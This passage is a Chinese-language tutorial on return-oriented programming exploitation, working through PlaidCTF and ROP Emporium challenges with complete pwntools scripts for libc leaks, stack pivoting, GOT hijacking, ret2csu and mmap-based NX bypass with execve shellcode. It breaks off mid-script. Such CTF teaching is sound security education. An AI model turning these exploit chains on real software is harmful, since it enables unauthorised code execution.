> 通常在通过构造ROP进行漏洞利用时，可能不能在一次溢出利用中完成整个攻击，比如首次构造ROP利用漏洞泄露libc后，还要再次在程序退出前再次触发漏洞函数，这时候可以在ROP中将返回地址覆写成程序main函数地址或存在漏洞的函数vul_func()地址，这样就可以达到在程序一次执行过程中反复触发漏洞函数的目的，来完成整个攻击流程。



### ROP构造多次溢出

**案例: ropasaurusrex (PlaidCTF 2013)**

https://github.com/PHX2600/plaidctf-2013/tree/master/ropasaurusrex

```
// IDA Pro反编译结果:
int __cdecl main()
{
    stack_overflow();
    return write(1, "WIN\n", 4u);
}
ssize_t stack_overflow()
{
    char buf; // [sp+10h] [bp-88h]@1
    return read(0, &buf, 0x100u);
}
```

buf长度为0x88，而read函数读入长度为0x100，存在栈溢出。
根据IDA Pro标记的buf位置，或调试可以得到，要覆盖到返回地址，填充的长度是(0x88 + 4)

**缓解机制**

```
 $ checksec
 STACK CANARY : No canary found
 NX : NX enabled
 PIE : No PIE
 RELRO : No RELRO
 RPATH : No RPATH
 RUNPATH : No RUNPATH
```

**控制EIP**

使用python库pwntools与程序交互，pwntools同时支持标准输入输出方式的交互和远程TCP连接的方式的交互。

输入(0x88+4)个A，再加上"BBBB"，可以正好让"BBBB"覆盖返回地址，从而劫持eip

```
from pwn import *
context(arch='i386', os='linux', endian='little', log_level='debug')
elf = ELF('./ropasaurusrex')
# 这里采用标准输入输出交互的方式
p = process(elf.path)
# p = remote('127.0.0.1', 1337)
print '[+] PID: %s' % proc.pidof(p)
payload = 'A'*(0x88 + 4) + 'BBBB'
p.send(payload)
p.interactive()
```

除了程序本身的实现的函数之外，我们还可以使用read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实有write@plt()函数就够了，因为我们可以通过write@plt()函数把write()函数在内存中的地址也就是write.got给打印出来。

因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。然后我们再将pc指针return回vulfunc()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。

**溢出两次**

- 第一次ROP，构造info leak(如调用write、puts、printf等)，泄露libc地址，可泄露got表中write函数的地址

  * 调用write(1, write_got, 4), write函数可以通过plt调用
  * 到main()函数并再次触发溢出

- 读取泄露的write函数地址，计算lib_base，进一步计算system()和字符串'/bin/sh'的地址

- 第二次ROP，调用system('/bin/sh')

  ```
  #!/usr/bin/env python
  from pwn import *
  context.log_level = 'debug'
  elf = ELF('./ropasaurusrex')
  libc = elf.libc
  write_plt = elf.plt['write']
  write_got = elf.got['write']
  vulfunc = 0x080483f4
  p = process(elf.path)
  
  # write(1, write_got, 4), 并返回vulfunc()做第二次利用
  payload = b'A' * 0x8c
  payload += p32(write_plt)
  payload += p32(vulfunc)
  payload += p32(1)
  payload += p32(write_got)
  payload += p32(4)
  p.send(payload)
  
  # 计算system和binsh的地址
  write_addr = u32(p.recv(4))
  libc_base = write_addr - libc.sym['write']
  system_addr = libc_base + libc.sym['system']
  exit_addr = libc_base + libc.sym['exit']
  binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
  
  # 调用system('/bin/sh')
  payload = b'A' * 0x8c
  payload += p32(system_addr)
  payload += p32(exit_addr)    # or p32(0xdeadbeef)
  payload += p32(binsh_addr)
  p.send(payload)
  
  p.interactive()
  ```




### 栈迁移(Stack Pivot)

![img](images/从栈溢出到ROP/stack_pivot1.png)

**定义**

+ 通过一个修改esp寄存器的gadget来改变栈的位置

**应用场景**

+ 溢出长度较短，不够做ROP(左上案例)
+ 溢出载荷以0结尾，而gadget地址为0开头(右上案例)
+ 在泄露地址后，我们需要执行一个新的ROP链

**栈迁移："add esp"**
将esp加上一个固定值的gadget我们称为"add esp"，例如: add esp, 0x6C; ret;

下图将演示栈迁移的过程，从栈溢出函数返回开始。

![img](images/从栈溢出到ROP/stack_pivot2.png)

![img](images/从栈溢出到ROP/stack_pivot3.png)

**栈迁移："pop ebp ret" + "leave ret"**
    "pop ebp; ret;" + "leave; ret;"两个gadget组合可以将esp改成任意值。
    "pop ebp; ret;"可以将ebp改成任意值
    leave = mov esp, ebp; pop ebp;因此ebp会存入esp，esp可任意控制。

![img](images/从栈溢出到ROP/stack_pivot4.png)

![img](images/从栈溢出到ROP/stack_pivot5.png)

![img](images/从栈溢出到ROP/stack_pivot6.png)

![img](images/从栈溢出到ROP/stack_pivot7.png)

> 除了使用 "pop ebp ret" + "leave ret"组合，在栈溢出时，由于覆盖返回地址前还会覆盖保存的ebp，因此实际上不需要pop ebp ret也是能控制ebp的，因此这种情况下，只需使用指定的值覆盖ebp，使用leave ret覆盖返回地址也可以完成栈迁移，布局示意如下：
>
> [ AAAA ]
> [     ...    ]
> [ AAAA ]
> [  EBP   ]    // 覆写为目标ebp 为new stack地址
> [  EIP    ]    // 返回地址覆写为leave ret
>
> 这样所溢出覆盖的指令更短，仅覆写8字节(EBP和返回地址)就可以劫持执行流到新栈，然后可以通过新栈上构造的ROP进行进一步利用。详细参考案例2。

##### 案例1: ropasaurusrex (PlaidCTF 2013)

https://github.com/PHX2600/plaidctf-2013/tree/master/ropasaurusrex

案例同上，前面经过两次溢出完成利用，这里通过栈迁移方式一样可以完成利用：

- 第一次ROP，泄露libc地址
  + 调用write(1, write_got, 4),泄露write函数地址
  + 调用read(0, new_stack, ROP_len), 读取第二次ROP Payload到bss段(新的栈)
  + 利用栈迁移"pop ebp ret" + "leave ret"，连接执行第二次ROP
- 读取泄露的write函数地址，计算system()和字符串'/bin/sh'的地址
- 根据计算出的system和binsh地址，输入第二次的ROP
- 等待栈迁移触发第二次ROP执行，启动shell

```
#!/usr/bin/env python
from pwn import *
context(arch='i386', os='linux', endian='little', log_level = 'debug')
elf = ELF('./ropasaurusrex')
libc = elf.libc
p = process(elf.path)
pop_ebp = 0x080483c3    # pop ebp; ret
leave_ret = 0x080482ea  # leave ret; <=> mov esp, ebp; pop ebp; ret
pop3_ret = 0x080484b6
bss = 0x08049628
new_stack = bss + 4

payload = b'A' * 0x8c
# 首先泄露地址，构造ROP调用write(1, write_got, 4)
payload += p32(elf.plt['write']) + p32(pop3ret) + p32(1) + p32(elf.got['write']) + p32(4)
# 然后读取第二次ROP到新的栈上，read(0, new_stack, 12)
payload += p32(elf.plt['read']) + p32(pop3ret) + p32(0) + p32(new_stack) + p32(12)
# 栈迁移连接第二次ROP: pop ebp ret + leave ret
payload += p32(popret) + p32(bss) + p32(leaveret)
p.send(payload)
# 接收泄露的write函数地址，并且计算system和binsh地址
write_addr = u32(p.recv(4))
libcbase = write_addr - libc.sym['write']
system_addr = libcbase + libc.sym['system']
binsh_addr = libcbase + next(libc.search(b'/bin/sh\0'))
# 发送第二次ROP payload：system('/bin/sh')
p.send(p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr))
# 等待栈迁移触发第二次ROP执行，启动shell
p.interactive()
```



##### 案例2：ropemporium pivot

  http://ropemporium.com/binary/pivot32.zip

```
int __cdecl pwnme(void *buf)
{
  char s; // [esp+0h] [ebp-28h]

  memset(&s, 0, 0x20u);
  puts("Call ret2win() from libpivot");
  printf("The Old Gods kindly bestow upon you a place to pivot: %p\n", buf);
  puts("Send a ROP chain now and it will land there");
  printf("> ");
  read(0, buf, 256u);
  puts("Thank you!\n");
  puts("Now please send your stack smash");
  printf("> ");
  read(0, &s, 56u);
  return puts("Thank you!");
}
```

在该案例中，栈上可用的空间很小，因此必须找到一个方法来到更多的空间，这时候可以利用栈迁移的方法。针对这题也有不同的解题思路：

```
# 解法1，按题目原要求实现调用ret2win
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
elf = ELF('./pivot32')
libpivot32 = ELF('libpivot32.so')
p = process(elf.path)
pause()

p.recvuntil(': ')
new_stack = int(p.recv(10), 16)
print('new_stack={}'.format(hex(new_stack)))
pop_ret = 0x0804889b
leave_ret = 0x080485f5

p.recvuntil('> ')
payload = p32(elf.plt['foothold_function'])   # 由于延迟绑定机制，先调用一次目标函数保证GOT项写入
payload += p32(elf.plt['puts'])               # 调用puts泄露foothold_function@got
payload += p32(pop_ret)
payload += p32(elf.got['foothold_function'])
payload += p32(elf.plt['read'])               # 调用read写入ret2win地址
payload += p32(0xdeadbeef)                    # 返回地址占位符，将被改写为ret2win地址
payload += p32(0)
payload += p32(new_stack + 20)                # 刚好指向0xdeadbeef占位符地址
payload += p32(4)
p.send(payload)

# 溢出16字节进行栈迁移到上面构造的ROP链
p.recvuntil('> ')
payload = b'A' * 0x28
payload += p32(new_stack - 4)                 # saved ebp
payload += p32(leave_ret)                     # mov esp, ebp; pop ebp
p.send(payload)

# 读取leak出的foothold_function@got地址，计算ret2win地址，并写入
p.recvuntil('libpivot\n')
foothold = u32(p.recv(4))
print('foothold={}'.format(hex(foothold)))
libbase = foothold - libpivot32.sym['foothold_function']
ret2win = libbase + libpivot32.sym['ret2win']
p.send(p32(ret2win))

p.interactive()
```



```
# 解法2，扩展一下，可以直接执行system('/bin/sh')
#!/usr/bin/env python
from pwn import *
elf = ELF('./pivot32')
libc = elf.libc
p = process(elf.path)
pause()

pop3_ret = 0x08048899
pop_ret = 0x0804889b
leave_ret = 0x080485f5
p.recvuntil(': ')
new_stack = int(p.recv(10), 16)
print('new_stack={}'.format(hex(new_stack)))
p.recvuntil('> ')
payload = p32(elf.plt['puts'])
payload += p32(pop_ret)
payload += p32(elf.got['puts'])
payload += p32(elf.plt['read'])
payload += p32(pop3_ret)
payload += p32(0)
payload += p32(new_stack + 32)
payload += p32(12)
p.send(payload)

p.recvuntil('> ')
payload = b'A' * 0x28
payload += p32(new_stack - 4) # saved ebp
payload += p32(leave_ret)     # mov esp, ebp; pop ebp
p.send(payload)
p.recvuntil('Thank you!\n')
puts_addr = u32(p.recv(4))
print('puts_addr={}'.format(hex(puts_addr)))
libbase = puts_addr - libc.sym['puts']
system_addr = libbase + libc.sym['system']
binsh_addr = libbase + next(libc.search(b'/bin/sh\0'))
p.send(p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr))

p.interactive()
```

```
# 解法3，采用两次溢出方法执行system('/bin/sh')
#!/usr/bin/env python
from pwn import *
elf = ELF('./pivot32')
libc = elf.libc
p = process(elf.path)
pause()

pop_ebp = 0x0804889b
leave_ret = 0x080485f5
main = 0x08048686

p.recvuntil(': ')
new_stack = int(p.recv(10), 16)
print('new_stack={}'.format(hex(new_stack)))
p.recvuntil('> ')
payload = p32(0)
payload += p32(elf.plt['puts'])
payload += p32(main)
payload += p32(elf.got['puts'])
p.send(payload)

p.recvuntil('> ')
payload = b'A' * (0x28 + 4)
payload += p32(pop_ebp)
payload += p32(new_stack)
payload += p32(leave_ret)  # mov esp, ebp; pop ebp
p.send(payload)

p.recvuntil('Thank you!\n')
puts_addr = u32(p.recv(4))
print('puts_addr={}'.format(hex(puts_addr)))
libbase = puts_addr - libc.sym['puts']
system_addr = libbase + libc.sym['system']
binsh_addr = libbase + next(libc.search(b'/bin/sh\0'))

p.recvuntil(': ')
new_stack = int(p.recv(10), 16)
print('new_stack={}'.format(hex(new_stack)))
p.recvuntil('> ')
payload = p32(0)
payload += p32(system_addr)
payload += p32(0xdeadbeef)
payload += p32(binsh_addr)
p.send(payload)

p.recvuntil('> ')
payload = b'A' * (0x28)
payload += p32(new_stack)
payload += p32(leave_ret)  # mov esp, ebp; pop ebp
p.send(payload)

p.interactive()
```



### 构造ROP劫持GOT表

**思路**

  + 在前面描述的ROP一般构造思路中，先利用ROP泄露libc地址，然后计算system地址，再布置新的ROP调用system()
  + 上述方法中，我们需要执行两次ROP，第二次ROP Payload依赖第一次ROP泄露的地址，能否只用一次ROP就完成利用？
  + 在ROP中通过return to PLT调用read和write，实际上可以实现内存任意读写
  + 因此，为了最终执行system()我们可以不使用ROP，而是使用GOT表劫持的方法：先通过ROP调用read，来修改write函数的GOT表项，然后再次write，实际上此时调用的则是GOT表项被劫持后的值，例如system()


**详细步骤**

使用一次ROP，完成libc地址泄露、GOT表劫持、命令字符串写入

  - 调用write(1, write_got, 4)，泄露write函数地址
    - 读取泄露的write函数地址，计算system()地址
    - 调用read(0, write_got, 4)，修改write()函数的GOT表项为system地址
    - 调用read(0, bss, len(cmd))，将命令字符串("/bin/sh")写入.bss section
    - 调用write(cmd)，实际上调用的system(cmd)
  - 读取system()地址，修改write()函数的GOT表项
  - 输入命令字符串"/bin/sh"，写入.bss section
  - 调用write(cmd)来运行system(cmd)

**案例 ropasaurusrex (PlaidCTF 2013)**

https://github.com/PHX2600/plaidctf-2013/tree/master/ropasaurusrex

```
from pwn import *
context(arch='i386', os='linux', endian='little', log_level = 'debug')
pop3_ret = 0x080484b6
bss = 0x08049628
cmd = b'/bin/sh\0'
elf = ELF('./ropasaurusrex')
libc = elf.libc
p = process(elf.path)
print('[+] PID: {}'.format(proc.pidof(p)))

payload = b'A' * 0x8c
# 首先泄露地址,write(1, write_got, 4)
payload += p32(elf.plt['write']) + p32(pop3_ret) + p32(1) + p32(elf.got['write']) + p32(4)
# 利用read函数修改write()函数的GOT表项，read(0, write_got, 4)
payload += p32(elf.plt['read']) + p32(pop3_ret) + p32(0) + p32(elf.got['write']) + p32(4)
# 利用read函数读取命令字符串，写入.bss section, read(0, bss, len(cmd))
payload += p32(elf.plt['read']) + p32(pop3_ret) + p32(0) + p32(bss) + p32(len(cmd))
# 调用write(cmd)，由于write的GOT表项被劫持，实际上调用的system(cmd)
payload += p32(elf.plt['read']) + p32(0xdeadbeef) + p32(bss)
p.send(payload)
# 接收泄露的write函数地址，并计算system地址
write_addr = u32(p.read(4))
libc_base = write_addr - libc.sym['write']
system_addr = libc_base + libc.sym['system']
print('system_addr={}'.format(system_addr))
# 发送system函数地址和命令，劫持write函数GOT表项，并写入命令至bss section
p.send(p32(system_addr) + cmd)
# 等待执行system(cmd)
p.interactive()
```



## ret2csu

**64位架构下的ROP**

- arm64（64位)cdecl调用约定
  - 使用寄存器rdi, rsi, rdx, rcx, r8, r9来传递前6个参数
  - 第七个及以上的参数通过栈来传递
- 参数在寄存器中，必须用gadget来设置参数
  - pop rdi; ret
  - pop rsi; pop r15; ret;
  - 用gadget设置rdx和rcx寄存器就比较困难一点，没有例如pop ret这种特别直接的gadget
  
- x64下通用Gadget: `__libc_csu_init`
  - 几乎所有的x64 ELF在`__libc_csu_init`函数中存在上面两个Gadget，第二个Gadget可以设置r13,r14,r15,再通过第一个Gadget将这三个值分别送入rdx,rsi,edi中，正好涵盖了x64 cdecl调用约定下的前三个参数。

  - 中间有几处关键的地方

    * 设置rbx为0(一般情况)
    * 设置rbp为1
    * 此处控制第三个参数为edi而非rdi，即默认第三个参数只能设置32位，如需设置64位参数，需配合其他gadget，参考案例1

  - 有两种利用思路
    * 构造r12为可正常解引用的代码段指针，即只需保证call qword ptr [r12+rbx*8]不报错即可，顺序执行到下面ret来构造rop，参考案例1
    * 构造r12为func@got，利用call qword ptr [r12+rbx*8]实现调用程序got表中的函数如write@got等构造rop链，参考案例2


  ```
      .text:0000000000400670 loc_400670:                             ; CODE XREF: __libc_csu_init+54↓j
      .text:0000000000400670                 mov     rdx, r13
      .text:0000000000400673                 mov     rsi, r14
      .text:0000000000400676                 mov     edi, r15d
      .text:0000000000400679                 call    qword ptr [r12+rbx*8]
      .text:000000000040067D                 add     rbx, 1
      .text:0000000000400681                 cmp     rbp, rbx
      .text:0000000000400684                 jnz     short loc_400670
      .text:0000000000400686
      .text:0000000000400686 loc_400686:                             ; CODE XREF: __libc_csu_init+34↑j
      .text:0000000000400686                 add     rsp, 8
      .text:000000000040068A                 pop     rbx
      .text:000000000040068B                 pop     rbp
      .text:000000000040068C                 pop     r12
      .text:000000000040068E                 pop     r13
      .text:0000000000400690                 pop     r14
      .text:0000000000400692                 pop     r15
      .text:0000000000400694                 retn
      .text:0000000000400694 __libc_csu_init endp
  ```

> 通过0x400686处的代码可以控制rbx,rbp,r12,r13,r14和r15的值，再利用0x400670处的代码可以将r13的值赋值给rdx, r14的值赋值给rsi,r15的值赋值给edi。随后调用
> `call qword ptr [r12+rbx*8]`，这里只要控制rbx值为0，就可以控制调用到r12指向的地址。然后会对rbx加1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址，所以这里需要将rbp的值设置为1。ret2csu就是按照这个思路来构造ROP链的



**案例1：ropemporium ret2csu**

https://ropemporium.com/binary/ret2csu.zip

程序需rop构造ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)才能利用成功。

即通过ret2csu构造rdi,rsi,rdx三个寄存器值分别为0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d，再调用ret2win即可。注意这里ret2csu中mov edi, r13d指令只能控制到rdi的低32位，故需要额外找一个pop rdi ; ret的gadget来配合控制rdi完成利用。

同时call qword ptr [r12+rbx*8]我们这里用不到，故需要找一个可以解引用并指向可执行代码的地址赋给r12，来保证这条call指令执行时不报错，参考[网上文章](https://blog.r0kithax.com/ctf/infosec/2020/10/20/rop-emporium-ret2csu-x64.html)找到 0x600e48 这个地址符合条件，看作者查找该地址方法是使用radare2通过一系列搜索和试验得到。该地址解引用后的代码指向如下，刚好符合条件

```
0x004006b4      4883ec08       sub rsp, 8                  ; [14] -r-x section size 9 named .fini
0x004006b8      4883c408       add rsp, 8
0x004006bc      c3             ret
```

完整利用代码如下：

```
#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
elf = ELF('ret2csu')
p = process(elf.path)
pause()

csu_gadget_1 = 0x400680          # mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12+rbx*8]
csu_gadget_2 = 0x400696          # add rsp, 8 ; pop rbx; pop rbp; r12; r13; r14 ; r15 ; retn
dereferenceable_addr = 0x600e48  # pointer to an executable location with "sub rsp, 8; add rsp, 8 ; ret"
popret = 0x4006a3                # pop rdi ; ret
ret2win_plt = elf.plt['ret2win']

p.recvuntil('> ')
payload = b'A' * 0x28

# ret2csu
payload += p64(csu_gadget_2)
payload += p64(0)                     # padding
payload += p64(0)                     # rbx
payload += p64(1)                     # rbp
payload += p64(dereferenceable_addr)  # r12
payload += p64(0)                     # r13 (edi)
payload += p64(0xcafebabecafebabe)    # r14 (rsi)
payload += p64(0xd00df00dd00df00d)    # r15 (rdx)
payload += p64(csu_gadget_1)          # ret
payload += p64(0)                     # padding
payload += p64(0)                     # rbx
payload += p64(0)                     # rbp
payload += p64(0)                     # r12
payload += p64(0)                     # r13
payload += p64(0)                     # r14
payload += p64(0)                     # r15

# set rdi = 0xdeadbeefdeadbeef
payload += p64(popret)
payload += p64(0xdeadbeefdeadbeef)    # rdi
payload += p64(ret2win_plt)

p.send(payload)
p.recvall()
p.interactive()
```

 

**案例2：ret2csu**

```
//gcc bof.c -fno-stack-protector -no-pie -obof
#include <unistd.h>

int main(int argc, char *argv[])
{
        char buf[32];
        write(1, "PWNME\n", 6);
        read(0, buf, 256);
        return 0;
}
```

目标程序如上。程序只有一个栈溢出，要先泄露内存信息，找到system()的地址，再构造“/bin/sh”到.bss段, 最后调用system(“/bin/sh”)。原程序使用了write()和read()函数，可以通过write()输出write@got的地址，从而计算出libc.so在内存中的地址。考虑到x64的参数传递约定，需要利用ret2csu构造rop。需构造触发三次溢出：

利用write()输出write在内存中的地址。注意利用的gadget是`call qword ptr [r12+rbx*8]`，所以这里应该使用write@got的地址而不是write@plt的地址。并且调用完成后要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。根据泄露的地址就可以计算出system()的地址。

然后利用read()将system()的地址以及“/bin/sh”读入到.bss段内存中。system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。

最后调用system()函数执行“/bin/sh”。

> 为什么不用libc里的地址，经过调试可知，这里ret2csu默认只能控制edi，即传入参数得是32位地址，而libc里的地址通常为64位，.bss地址范围符合要求。另外这里system()地址本身也需要写入，通过一次read()调用同时写入"/bin/sh"也比较方便。当然配合pop rdi;ret这样的gadget控制rdi应该也可以实现利用libc中已有的字符串，方法不唯一。

最终exp如下：

```
#!/usr/bin/env python
from pwn import *
#context.log_level = 'debug'

elf = ELF('./bof')
libc = elf.libc
p = process(elf.path)
#pause()

ret2csu_gadget1 = 0x4011e0
ret2csu_gadget2 = 0x4011f6
main = 0x401156
bss = 0x404038
read_got = elf.got['read']
write_got = elf.got['write']

# 调用 write@got(1, write@got, 8) leak libc
payload = b'A' * 40
payload += p64(ret2csu_gadget2)
payload += p64(0)  # padding
payload += p64(0)  # rbx
payload += p64(1)  # rbp
payload += p64(1)  # r12, edi
payload += p64(write_got) # r13, rsi
payload += p64(8)  # r14, rdx
payload += p64(write_got)
payload += p64(ret2csu_gadget1)
payload += p64(0) * 7 # padding, rbx, rbp, r12, r13, 14, r15
payload += p64(main)

p.recvuntil('PWNME\n')
p.send(payload)
sleep(1)

write_addr = u64(p.recv(8))
libbase = write_addr - libc.sym['write']
system_addr = libbase + libc.sym['system']
exit_addr = libbase + libc.sym['exit']
print('write_addr={}'.format(hex(write_addr)))
print('libbase={}'.format(hex(libbase)))
print('system_addr={}'.format(hex(system_addr)))

# 调用 read@got(1, bss, 16) 将system地址和/bin/sh字符串写入bss
payload = b'A' * 40
payload += p64(ret2csu_gadget2)
payload += p64(0)  # padding
payload += p64(0)  # rbx
payload += p64(1)  # rbp
payload += p64(0)  # r12, edi
payload += p64(bss) # r13, rsi
payload += p64(16)  # r14, rdx
payload += p64(read_got)
payload += p64(ret2csu_gadget1)
payload += p64(0) * 7 # padding, rbx, rbp, r12, r13, 14, r15
payload += p64(main)

p.recvuntil('PWNME\n')
p.send(payload)
sleep(1)

# 写入system地址和/bin/sh字符串
p.send(p64(system_addr) + b'/bin/sh\x00')
sleep(1)

# 调用system('/bin/sh')
payload = b'A' * 40
payload += p64(ret2csu_gadget2)
payload += p64(0)  # padding
payload += p64(0)  # rbx
payload += p64(1)  # rbp
payload += p64(bss+8)  # r12, edi  # /bin/sh地址
payload += p64(0) # r13, rsi
payload += p64(0)  # r14, rdx
payload += p64(bss)
payload += p64(ret2csu_gadget1)
payload += p64(0) * 7 # padding, rbx, rbp, r12, r13, 14, r15
payload += p64(exit_addr)

p.recvuntil('PWNME\n')
p.send(payload)

p.interactive()
```



**案例3 ret2csu构造mmap/mprotect绕过NX**

以上例子中基本都是通过rop执行system取得一个shell。事实上还有很多复杂的shellcode可以完成更复杂的功能，比如网上或msf里有很多现成的shellcode，例如通过socket反弹shell等。但是开启NX的情况下，这些shellcode也没法直接用。但是我们可以先构造rop通过mmap或者mprotect将某块内存改成RWX(可读可写可执行)，然后将shellcode保存到这块内存，然后控制pc跳转过去就可以执行任意的shellcode了。

我们首先用上一篇中提到的_`_libc_csu_init`中的通用gadgets泄露出got_write和_`dl_runtime_resolve`的地址。随后就可以根据偏移量和泄露的地址计算出其他gadgets的地址。然后我们利用`_dl_runtime_resolve`里的通用gadgets调用mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0),开辟一段RWX的内存在0xbeef0000处。随后我们使用read(rdi=0, rsi=shellcode_addr, rdx=1024),把我们想要执行的shellcode读入到0xbeef0000这段内存中。最后再将指针跳转到shellcode处就可执行我们想要执行的任意代码了。

**Exploit**

```
 #!/usr/bin/env python
 from pwn import *

 elf = ELF('level5')
 libc = ELF('libc.so.6')

 p = process('./level5')
 #p = remote('127.0.0.1',10001)

 got_write = elf.got['write']
 print "got_write: " + hex(got_write)
 got_read = elf.got['read']
 print "got_read: " + hex(got_read)
 plt_read = elf.symbols['read']
 print "plt_read: " + hex(plt_read)
 linker_point = 0x600ff8
 print "linker_point: " + hex(linker_point)
 got_pop_rax_ret = 0x0000000000023950
 print "got_pop_rax_ret: " + hex(got_pop_rax_ret)

 main = 0x400564

 off_mmap_addr = libc.symbols['write'] - libc.symbols['mmap']
 print "off_mmap_addr: " + hex(off_mmap_addr)
 off_pop_rax_ret = libc.symbols['write'] - got_pop_rax_ret
 print "off_pop_rax_ret: " + hex(off_pop_rax_ret)

 #rdi= edi = r13, rsi = r14, rdx = r15 
 #write(rdi=1, rsi=write.got, rdx=4)
 payload1 = "\x00"*136
 payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
 payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
 payload1 += "\x00"*56
 payload1 += p64(main)

 p.recvuntil("Hello, World\n")

 print "\n#############sending payload1#############\n"
 p.send(payload1)
 sleep(1)

 write_addr = u64(p.recv(8))
 print "write_addr: " + hex(write_addr)
 mmap_addr = write_addr - off_mmap_addr
 print "mmap_addr: " + hex(mmap_addr)
 pop_rax_ret = write_addr - off_pop_rax_ret
 print "pop_rax_ret: " + hex(pop_rax_ret)

 #rdi= edi = r13, rsi = r14, rdx = r15 
 #write(rdi=1, rsi=linker_point, rdx=4)
 payload2 = "\x00"*136
 payload2 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(linker_point) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret
 payload2 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]
 payload2 += "\x00"*56
 payload2 += p64(main)

 p.recvuntil("Hello, World\n")

 print "\n#############sending payload2#############\n"
 p.send(payload2)
 sleep(1)

 #raw_input()

 linker_addr = u64(p.recv(8))
 print "linker_addr + 0x35: " + hex(linker_addr + 0x35)

 p.recvuntil("Hello, World\n")

 shellcode = ( "\x48\x31\xc0\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e" +
               "\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89" +
               "\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" )
               

 # GADGET
 # 0x7ffff7def235 <_dl_runtime_resolve+53>: mov r11,rax
 # 0x7ffff7def238 <_dl_runtime_resolve+56>: mov r9,QWORD PTR [rsp+0x30]
 # 0x7ffff7def23d <_dl_runtime_resolve+61>: mov r8,QWORD PTR [rsp+0x28]
 # 0x7ffff7def242 <_dl_runtime_resolve+66>: mov rdi,QWORD PTR [rsp+0x20]
 # 0x7ffff7def247 <_dl_runtime_resolve+71>: mov rsi,QWORD PTR [rsp+0x18]
 # 0x7ffff7def24c <_dl_runtime_resolve+76>: mov rdx,QWORD PTR [rsp+0x10]
 # 0x7ffff7def251 <_dl_runtime_resolve+81>: mov rcx,QWORD PTR [rsp+0x8]
 # 0x7ffff7def256 <_dl_runtime_resolve+86>: mov rax,QWORD PTR [rsp]
 # 0x7ffff7def25a <_dl_runtime_resolve+90>: add rsp,0x48
 # 0x7ffff7def25e <_dl_runtime_resolve+94>: jmp r11

 shellcode_addr = 0xbeef0000

 #mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0)
 payload3 = "\x00"*136
 payload3 += p64(pop_rax_ret) + p64(mmap_addr)
 payload3 += p64(linker_addr+0x35) + p64(0) + p64(34) + p64(7) + p64(1024) + p64(shellcode_addr) + p64(0) + p64(0) + p64(0) + p64(0)

 #read(rdi=0, rsi=shellcode_addr, rdx=1024)
 payload3 += p64(pop_rax_ret) + p64(plt_read)
 payload3 += p64(linker_addr+0x35) + p64(0) + p64(0) + p64(1024) + p64(shellcode_addr) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0)

 payload3 += p64(shellcode_addr)

 print "\n#############sending payload3#############\n"
 p.send(payload3)
 sleep(1)

 p.send(shellcode+"\n")
 sleep(1)

 p.interactive()
```



##  ret2dl_resolve & DynElf

如果题目没有提供libc，或在获取不到目标机器上的libc.so情况下，可以考虑如下方案。

- 从libc base寻找我们需要的libc(http://libc.blukat.me/)

- 使用DynElf

  - 原理：如果可以实现任意内存读，可以模拟`_dl_runtime_resolve`函数的行为来解析符号

     这样的好处是无需知道libc。pwntools库中的DynELF模块已经实现了此功能。

  - 编写一个通用的任意内存泄露函数

  - 通过返回main()函数来允许内存泄露触发多次

    将泄露函数传入DynElf来解析system()函数的地址

  - 通过ROP来调用system('/bin/sh')

  - 当目标的libc库未知时，DynElf非常有用

**案例: ropasaurusrex (PlaidCTF 2013)**

这里我们采用pwntools提供的DynELF模块来进行内存搜索。首先我们需要实现一个`leak(address)`函数，通过这个函数可以获取到某个地址上最少1 byte的数据。随后将这个函数作为参数再调用`d = DynELF(leak, elf=ELF('./ropasaurusrex'))`就可以对DynELF模块进行初始化了。然后可以通过调用`system_addr = d.lookup('system', 'libc')`来得到libc.so中system()在内存中的地址。

要注意的是，通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可读写。通过`readelf -S ropasaurusrex`这个命令就可以获取到bss段的地址了。

整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system(.bss)，执行“/bin/sh”。

```
#!/usr/bin/env python
from pwn import *
context(arch='i386', os='linux', endian='little', log_level = 'debug')
main = 0x804841d
bss = 0x8049700
elf = ELF('./ropasaurusrex')
p = process(elf.path)
print('[+] PID: {}'.format(proc.pidof(p)))
# 将栈溢出封装成ROP调用，方便多次触发
def do_rop(rop):
   payload = b'A' * 0x8c
   payload += rop
   p.send(payload)

# 任意内存读函数，通过ROP调用write函数将任意地址内存写出，最后回到main，实现反复触发
def peek(addr):
   payload = b'A' * 0x8c
